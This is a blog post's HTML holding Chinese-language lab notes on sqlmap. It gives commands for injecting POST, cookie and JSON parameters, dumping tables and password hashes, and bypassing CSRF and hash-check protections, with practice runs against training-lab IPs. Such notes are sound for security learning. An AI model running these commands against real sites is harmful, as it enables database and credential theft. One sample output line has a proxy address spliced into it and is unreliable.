@@ -1,0 +1,554 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || sqlmap</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>sqlmap </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/7/14
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#ffa2c4>
+                    base
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/tool" style=color:#00a596>
+                    tool
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h2 id="GET-x2F-POST-Requests"><a href="#GET-x2F-POST-Requests" class="headerlink" title="GET&#x2F;POST Requests"></a>GET&#x2F;POST Requests</h2><p>在最常见的场景中，GET参数使用选项-u&#x2F;-url提供，如前一个示例所示。对于测试POST数据，可以使用–data标志，如下所示：</p>
+<span id="more"></span>
+
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;
+</code></pre>
+<p>在这种情况下，POST参数uid和name将针对SQLi漏洞进行测试。例如，如果我们有一个明确的指示，表明参数uid容易出现SQLi漏洞，我们可以使用-p uid将测试范围缩小到仅此参数。否则，我们可以使用特殊标记*在提供的数据中进行标记，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1*&amp;name=test&#39;
+</code></pre>
+<p>如果我们需要指定一个复杂的HTTP请求，该请求具有许多不同的头值和一个细长的POST主体，我们可以使用-r标志。有了这个选项，SQLMap就有了“请求文件”，将整个HTTP请求包含在一个文本文件中。在一种常见的场景中，可以从专用代理应用程序（例如Burp）中捕获此类HTTP请求，并将其写入请求文件。</p>
+<p>提示：与’–data’选项类似，在保存的请求文件中，我们可以用星号（*）指定要注入的参数，例如’&#x2F;？id&#x3D;*’。</p>
+<p>如果我们想指定一种替代HTTP方法，而不是GET和POST（例如PUT），我们可以使用选项–method，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u www.target.com --data=&#39;id=1&#39; --method PUT
+</code></pre>
+<h2 id="Custom-HTTP-Requests"><a href="#Custom-HTTP-Requests" class="headerlink" title="Custom HTTP Requests"></a>Custom HTTP Requests</h2><p>除了最常见的表单数据POST主体样式（例如id&#x3D;1）外，SQLMap还支持JSON格式（例如｛“id”:1｝）和XML格式（例如<element><id>1</id></element>）的HTTP请求。 对这些格式的支持是以一种“宽松”的方式实现的；因此，对于参数值如何存储在内部没有严格的约束。如果POST正文相对简单而简短，那么选项–data就足够了。 但是，在POST主体复杂或较长的情况下，我们可以再次使用-r选项</p>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>target:94.237.62.6:35238</p>
+</blockquote>
+<p><strong>What’s the contents of table flag2? (Case #2 POST parameter)</strong></p>
+<pre><code>sqlmap -u http://94.237.62.6:35238/case2.php --data=&#39;id=*&#39; --batch --dump
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141052194.png" alt="image-20230714105227130"></p>
+<p><strong>What’s the contents of table flag3? (Case #3 Cookie value)</strong></p>
+<pre><code>sqlmap -u http://94.237.62.6:35238/case2.php  --cookie=&#39;id=*&#39; --batch --dump
+</code></pre>
+<p>这里要注意请求方式变成了get，以及cookie里的参数后面要加一个<code>*</code>不然会显示没有提供参数,（应该相当于在<code>*</code>位置FUZZ所以是否保留参数需要考虑）。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141122747.png" alt="image-20230714112217706"></p>
+<p> <strong>What’s the contents of table flag4? (Case #4 JSON value)</strong></p>
+<p>这里抓包之后发现json是附在请求末尾：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141118987.png" alt="image-20230714111845937"></p>
+<p>那么应该不用每次都抓包也能写出一个payload文档</p>
+<pre><code>sqlmap -r test.txt -p id --batch --dump -D testdb -T flag4
+</code></pre>
+<p>按照示例给的跑实在太慢了动辄十来分钟(后一节的内容都看完了)，还是稍微手工一下，指定更多的参数去找flag</p>
+<h1 id="Handling-SQLMap-Errors"><a href="#Handling-SQLMap-Errors" class="headerlink" title="Handling SQLMap Errors"></a>Handling SQLMap Errors</h1><h2 id="Display-Errors"><a href="#Display-Errors" class="headerlink" title="Display Errors"></a>Display Errors</h2><p>第一步通常是切换–parse-errors，解析DBMS错误（如果有的话），并将其显示为程序运行的一部分：</p>
+<pre><code class="shell-session">...SNIP...
+[16:09:20] [INFO] testing if GET parameter &#39;id&#39; is dynamic
+[16:09:20] [INFO] GET parameter &#39;id&#39; appears to be dynamic
+[16:09:20] [WARNING] parsed DBMS error message: &#39;SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;))&quot;&#39;,),)((&#39; at line 1&#39;&quot;
+[16:09:20] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)
+[16:09:20] [WARNING] parsed DBMS error message: &#39;SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;YzDZJELylInm&#39; at line 1&#39;
+...SNIP...
+</code></pre>
+<h2 id="Store-the-Traffic"><a href="#Store-the-Traffic" class="headerlink" title="Store the Traffic"></a>Store the Traffic</h2><p>-t选项将整个流量内容存储到一个输出文件中：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --batch -t /tmp/traffic.txt
+</code></pre>
+<p>正如我们从上面的输出中看到的，&#x2F;tmp&#x2F;traffic.txt文件现在包含所有发送和接收的HTTP请求。因此，我们现在可以手动调查这些请求，看看问题发生在哪里。</p>
+<h2 id="Verbose-Output"><a href="#Verbose-Output" class="headerlink" title="Verbose Output"></a>Verbose Output</h2><p>另一个有用的标志是-v选项，它提高了控制台输出的详细程度：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; -v 6 --batch
+</code></pre>
+<h2 id="Using-Proxy"><a href="#Using-Proxy" class="headerlink" title="Using Proxy"></a>Using Proxy</h2><p>最后，我们可以使用–proxy选项通过（MiTM）代理（例如Burp）重定向整个流量。这将通过Burp路由所有SQLMap流量，以便我们稍后可以手动调查所有请求，重复它们，并利用Burp的所有功能处理这些请求</p>
+<h1 id="Attack-Tuning"><a href="#Attack-Tuning" class="headerlink" title="Attack Tuning"></a>Attack Tuning</h1><p>在大多数情况下，SQLMap应该随提供的目标详细信息一起开箱即用。尽管如此，仍有一些选项可以微调SQLi注入尝试，以帮助SQLMap进入检测阶段。发送到目标的每个有效载荷包括： vector（例如，UNION ALL SELECT 1,2，VERSION（））：有效负载的中心部分，承载要在目标上执行的有用SQL代码。 边界（例如<code>&lt;vector&gt;-- - </code>）：前缀和后缀形式，用于将向量正确注入易受攻击的SQL语句。</p>
+<h2 id="Prefix-x2F-Suffix"><a href="#Prefix-x2F-Suffix" class="headerlink" title="Prefix&#x2F;Suffix"></a>Prefix&#x2F;Suffix</h2><p>在极少数情况下，需要特殊的前缀和后缀值，常规SQLMap运行不包括这些值。 对于这样的运行，选项–prefix和–suffix可以按如下方式使用：</p>
+<pre><code class="bash">sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#39;))&quot; --suffix=&quot;-- -&quot;
+</code></pre>
+<h2 id="Level-x2F-Risk"><a href="#Level-x2F-Risk" class="headerlink" title="Level&#x2F;Risk"></a>Level&#x2F;Risk</h2><p>默认情况下，SQLMap结合了一组预定义的最常见的边界（即前缀&#x2F;后缀对），以及在易受攻击的目标情况下成功几率很高的向量。尽管如此，用户还是有可能使用更大的边界和向量集，这些边界和向量已经合并到SQLMap中。 对于此类需求，应使用选项–级别和–风险： 选项–level（1-5，默认为1）根据成功的预期（即，预期越低，级别越高）扩展了所使用的向量和边界。 选项–risk（1-3，默认值1）根据在目标端造成问题的风险（即数据库条目丢失或拒绝服务的风险）扩展所使用的向量集。 对于不同的–level和–risk值，检查使用的边界和有效载荷之间的差异的最佳方法是使用-v选项来设置详细级别。在详细程度3或更高（例如-v 3）中，将显示包含所用[PAYLOAD]的消息</p>
+<h2 id="Advanced-Tuning"><a href="#Advanced-Tuning" class="headerlink" title="Advanced Tuning"></a>Advanced Tuning</h2><h4 id="Status-Codes"><a href="#Status-Codes" class="headerlink" title="Status Codes"></a>Status Codes</h4><p>例如，当处理具有大量动态内容的巨大目标响应时，TRUE和FALSE响应之间的细微差异可以用于检测目的。如果在HTTP代码中可以看到TRUE和FALSE响应之间的差异（例如，TRUE为200，FALSE为500），则选项–code可以用于将TRUE响应的检测固定到特定的HTTP代码（例如–code&#x3D;200）。</p>
+<h4 id="Titles"><a href="#Titles" class="headerlink" title="Titles"></a>Titles</h4><p>如果通过检查HTTP页面标题可以看到响应之间的差异，则开关–title可以用于指示检测机制基于HTML标记<title>的内容进行比较。</p>
+<h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p>如果某个特定字符串值出现在TRUE响应中（例如成功），而在FALSE响应中不存在，则选项–string可用于仅根据该单个值的出现来固定检测（例如–string&#x3D;成功）。</p>
+<h4 id="Text-only"><a href="#Text-only" class="headerlink" title="Text-only"></a>Text-only</h4><p>当处理许多隐藏的内容时，例如某些HTML页面行为标签（例如＜script＞、＜style＞、＜meta＞等），我们可以使用–text only开关，它删除所有HTML标签，并仅基于文本（即可见）内容进行比较。</p>
+<h4 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h4><p>在某些特殊情况下，我们不得不将使用的有效载荷缩小到特定类型。例如，如果基于时间的盲有效载荷以响应超时的形式引起了麻烦，或者如果我们想强制使用特定的SQLi有效载荷类型，选项-技术可以指定要使用的SQLi技术。 例如，如果我们想跳过基于时间的盲和堆叠SQLi有效载荷，只测试基于布尔的盲、基于错误和UNION查询有效载荷，我们可以使用–technique&#x3D;BEU指定这些技术。</p>
+<h4 id="UNION-SQLi-Tuning"><a href="#UNION-SQLi-Tuning" class="headerlink" title="UNION SQLi Tuning"></a>UNION SQLi Tuning</h4><p>在某些情况下，UNIONSQLi有效负载需要额外的用户提供的信息才能工作。如果我们可以手动找到易受攻击的SQL查询的确切列数，我们可以通过选项–union cols（例如–union cols&#x3D;17）将这个数字提供给SQLMap。如果SQLMap使用的默认“伪”填充值（NULL和随机整数）与易受攻击的SQL查询结果中的值不兼容，我们可以指定一个替代值（例如–union char&#x3D;’a’）。 此外，如果需要在UNION查询的末尾以FROM＜table＞的形式使用附录（例如，在Oracle的情况下），我们可以使用选项–UNION-FROM（例如–UNION-FROM&#x3D;users）来设置它。 未能自动使用正确的FROM附录可能是由于无法在使用前检测DBMS名称。</p>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the contents of table flag5? (Case #5 OR SQLi)</strong></p>
+<pre><code>sqlmap -u http://94.237.62.6:33702/case5.php?id=1  -D testdb -T flag5 --dump --risk=3 --level=5 --batch
+</code></pre>
+<p>强度不够用到的技术回显所有测试都无法注入，把强度提到最高</p>
+<p>但是这里要增加一个<code>--no-cast</code>来禁用类型转换，不然可能得到不准确的结果</p>
+<blockquote>
+<p>在sqlmap中，<code>--no-cast</code> 选项用于禁用类型转换。类型转换是sqlmap在进行注入测试时尝试将数据转换为不同类型的一种技术。</p>
+<p>当执行注入测试时，sqlmap会尝试通过将注入数据转换为不同类型来绕过目标网站的防御机制。这包括将字符串转换为数字、布尔值等。这种类型转换可以帮助sqlmap绕过一些简单的过滤或防御措施，以发现更深入的注入漏洞。</p>
+<p>然而，在某些情况下，类型转换可能导致误报或产生不准确的结果。如果您希望禁用类型转换，可以使用 <code>--no-cast</code> 选项。通过使用该选项，sqlmap将不会尝试进行任何类型转换，而是将数据保持原始的注入形式。</p>
+<p>以下是使用 <code>--no-cast</code> 选项的示例命令：</p>
+<pre><code class="shell">sqlmap -u &lt;目标URL&gt; --no-cast
+</code></pre>
+<p>请注意，禁用类型转换可能会限制sqlmap的能力来绕过某些防御机制。使用 <code>--no-cast</code> 选项时，需要仔细评估目标系统的情况，并确保测试的结果准确性和完整性。在进行任何安全测试时，请确保您已经获得适当的授权，并遵守法律和道德准则。</p>
+</blockquote>
+<p><strong>What’s the contents of table flag6? (Case #6 Non-standard boundaries)</strong></p>
+<pre><code>sqlmap -u http://94.237.59.206:49992/case6.php?col=id  --batch --dump --prefix &#39;`)&#39; -D testdb -T flag6
+</code></pre>
+<p> <strong>What’s the contents of table flag7? (Case #7 with adjustments)</strong></p>
+<blockquote>
+<p>Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+</blockquote>
+<pre><code class="\">sqlmap -u http://94.237.59.206:49992/case7.php?id=1  --batch --dump -D testdb -T flag7 --union-cols=5
+</code></pre>
+<h1 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h1><p>通常，在成功检测到SQLi漏洞后，我们可以开始枚举数据库中的基本细节，例如易受攻击目标的主机名（–hostname）、当前用户名（–current-user）、当前数据库名称（–current-db）或密码散列（–passwords）。SQLMap将跳过SQLi检测，如果它已经被早期识别，并直接启动DBMS枚举过程。 枚举通常从检索基本信息开始：</p>
+<ul>
+<li>数据库版本（switch <code>--banner</code>） </li>
+<li>当前用户名（switch –current-user） </li>
+<li>当前数据库名称（开关–current-db） </li>
+<li>正在检查当前用户是否具有DBA（administrator）权限。</li>
+</ul>
+<p> 以下SQLMap命令可执行上述所有操作：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --banner --current-user --current-db --is-dba
+</code></pre>
+<blockquote>
+<p>注：在绝大多数情况下，数据库上下文中的“root”用户与操作系统用户“root”没有任何关系，而不是代表DBMS上下文中的特权用户。这基本上意味着数据库用户在数据库上下文中不应该有任何约束，而操作系统权限（例如，文件系统写入任意位置）应该是最小化的，至少在最近的部署中是这样。同样的原则也适用于一般的“DBA”角色。</p>
+</blockquote>
+<h2 id="Table-Enumeration"><a href="#Table-Enumeration" class="headerlink" title="Table Enumeration"></a>Table Enumeration</h2><p>在大多数常见的场景中，在找到当前数据库名称（即testdb）后，将通过使用–tables选项并使用-D testdb指定数据库名称来检索表名，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --tables -D testdb
+</code></pre>
+<p>在发现感兴趣的表名后，可以通过使用–dump选项并使用-T用户指定表名来检索其内容，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb
+</code></pre>
+<p>可以通过选项“–dump format”将输出格式指定为HTML或SQLite，这样我们以后就可以在SQLite环境中进一步研究DB了。</p>
+<h2 id="Table-x2F-Row-Enumeration"><a href="#Table-x2F-Row-Enumeration" class="headerlink" title="Table&#x2F;Row Enumeration"></a>Table&#x2F;Row Enumeration</h2><p>当处理具有许多列和&#x2F;或行的大型表时，我们可以使用-C选项指定列（例如，仅名称和姓氏列），如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb -C name,surname
+</code></pre>
+<p>要根据表中的序号缩小行的范围，我们可以使用–start和–stop选项指定行（例如，从第二个条目开始到第三个条目），如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --start=2 --stop=3
+</code></pre>
+<h2 id="Conditional-Enumeration"><a href="#Conditional-Enumeration" class="headerlink" title="Conditional Enumeration"></a>Conditional Enumeration</h2><p>如果需要根据已知的WHERE条件检索某些行（例如name LIKE“f%”），我们可以使用选项–WHERE，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#39;f%&#39;&quot;
+</code></pre>
+<h2 id="Full-DB-Enumeration"><a href="#Full-DB-Enumeration" class="headerlink" title="Full DB Enumeration"></a>Full DB Enumeration</h2><p>我们可以通过完全跳过选项-T（例如-dump-D testdb）的使用来检索感兴趣的数据库中的所有表，而不是基于单个表检索内容。只需使用开关-dump而不指定带-T的表，就可以检索到所有当前的数据库内容。至于–dump-all开关，将检索所有数据库中的所有内容。 在这种情况下，还建议用户包括开关-exclude sysdbs（例如-dump-all-exclude sysdb），这将指示SQLMap跳过从系统数据库中检索内容，因为它通常对Pentester不太感兴趣。</p>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>What’s the contents of table flag1 in the testdb database? (Case #1)</strong></p>
+<pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  --batch --dump -D testdb -T flag1 
+</code></pre>
+<h1 id="Advanced-Database-Enumeration"><a href="#Advanced-Database-Enumeration" class="headerlink" title="Advanced Database Enumeration"></a>Advanced Database Enumeration</h1><h2 id="DB-Schema-Enumeration"><a href="#DB-Schema-Enumeration" class="headerlink" title="DB Schema Enumeration"></a>DB Schema Enumeration</h2><p>如果我们想检索所有表的结构，以便对数据库体系结构有一个完整的概述，我们可以使用switch –schema：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema
+</code></pre>
+<h2 id="Searching-for-Data"><a href="#Searching-for-Data" class="headerlink" title="Searching for Data"></a>Searching for Data</h2><p>当处理具有大量表和列的复杂数据库结构时，我们可以使用–search选项搜索感兴趣的数据库、表和列。此选项使我们能够使用LIKE运算符搜索标识符名称。例如，如果我们正在查找包含关键字user的所有表名，我们可以按如下方式运行SQLMap：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user
+</code></pre>
+<p>在上面的例子中，我们可以根据这些搜索结果立即发现几个有趣的数据检索目标。我们还可以尝试根据特定关键字搜索所有列名（例如pass）：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -C pass
+</code></pre>
+<h2 id="Password-Enumeration-and-Cracking"><a href="#Password-Enumeration-and-Cracking" class="headerlink" title="Password Enumeration and Cracking"></a>Password Enumeration and Cracking</h2><p>一旦我们识别出一个包含密码的表（例如master.users），我们就可以使用-T选项检索该表，如前所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -D master -T users
+</code></pre>
+<h2 id="DB-Users-Password-Enumeration-and-Cracking"><a href="#DB-Users-Password-Enumeration-and-Cracking" class="headerlink" title="DB Users Password Enumeration and Cracking"></a>DB Users Password Enumeration and Cracking</h2><p>除了在数据库表中找到的用户凭据之外，我们还可以尝试转储包含数据库特定凭据（例如，连接凭据）的系统表的内容。为了简化整个过程，SQLMap有一个特殊的开关——专门为这样的任务设计的–passwords：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch
+</code></pre>
+<h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the name of the column containing “style” in it’s name? (Case #1)</strong></p>
+<pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  --search -C style 
+</code></pre>
+<p><strong>What’s the Kimberly user’s password? (Case #1)</strong></p>
+<pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  -D testdb -T users -C name,password --dump
+</code></pre>
+<p>这里我想着用–where或者–search，但是发现好像搞不了。。。</p>
+<h1 id="Bypassing-Web-Application-Protections"><a href="#Bypassing-Web-Application-Protections" class="headerlink" title="Bypassing Web Application Protections"></a>Bypassing Web Application Protections</h1><h2 id="Anti-CSRF-Token-Bypass"><a href="#Anti-CSRF-Token-Bypass" class="headerlink" title="Anti-CSRF Token Bypass"></a>Anti-CSRF Token Bypass</h2><p>防止使用自动化工具的第一道防线是将反CSRF（即跨站点请求伪造）令牌合并到所有HTTP请求中，尤其是那些由于web表单填写而生成的请求。 在最基本的术语中，只有当用户实际访问并使用了页面时，这种场景中的每个HTTP请求才应该有一个（有效的）令牌值。虽然最初的想法是防止出现恶意链接的情况，在这种情况下，仅仅打开这些链接就会对不知情的登录用户产生不希望的后果（例如，打开管理员页面并添加具有预定义凭据的新用户），但这一安全功能也无意中强化了应用程序以抵御（不希望的）自动化。 尽管如此，SQLMap有一些选项可以帮助绕过反CSRF保护。也就是说，最重要的选项是–csrf-token。通过指定令牌参数名称（在提供的请求数据中应该已经可用），SQLMap将自动尝试解析目标响应内容并搜索新的令牌值，以便在下一个请求中使用它们。 此外，即使在用户没有通过–csrf-token明确指定令牌名称的情况下，如果提供的参数之一包含任何常见的中缀（即csrf、xsrf、token），用户也会在进一步的请求中被提示是否更新它：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot; --csrf-token=&quot;csrf-token&quot;
+</code></pre>
+<h2 id="Unique-Value-Bypass"><a href="#Unique-Value-Bypass" class="headerlink" title="Unique Value Bypass"></a>Unique Value Bypass</h2><p>在某些情况下，web应用程序可能只需要在预定义的参数内提供唯一的值。这种机制类似于上述的反CSRF技术，不同之处在于不需要解析网页内容。因此，通过简单地确保每个请求都有一个预定义参数的唯一值，web应用程序可以很容易地阻止CSRF尝试，同时避免一些自动化工具。为此，应使用选项–randomize，指向包含在发送之前应随机化的值的参数名称：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&amp;rp=29125&quot; --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&amp;rp=99954
+URI: http://www.example.com:80/?id=1&amp;rp=87216
+URI: http://www.example.com:80/?id=9030&amp;rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185
+</code></pre>
+<h2 id="Calculated-Parameter-Bypass"><a href="#Calculated-Parameter-Bypass" class="headerlink" title="Calculated Parameter Bypass"></a>Calculated Parameter Bypass</h2><p>另一种类似的机制是web应用程序期望基于一些其他参数值来计算适当的参数值。通常情况下，一个参数值必须包含另一个参数的消息摘要（例如h&#x3D;MD5（id））。要绕过这一点，应该使用–eval选项，其中在将请求发送到目标之前对有效的Python代码进行评估：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib; h=hashlib.md5(id).hexdigest()&quot; --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&amp;h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&amp;h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&amp;h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&amp;h=02312acd4ebe69e2528382dfff7fc5cc
+</code></pre>
